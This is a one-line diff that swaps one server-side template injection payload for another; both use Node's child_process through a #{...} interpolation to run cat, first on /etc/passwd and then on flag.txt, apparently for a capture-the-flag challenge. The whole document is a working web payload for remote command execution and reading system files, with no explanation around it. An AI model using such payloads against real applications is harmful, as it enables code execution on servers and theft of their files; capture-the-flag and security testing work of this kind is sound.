@@ -1,1 +1,1 @@
-#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+#{global.process.mainModule.require('child_process').spawnSync('cat', ['flag.txt']).stdout}
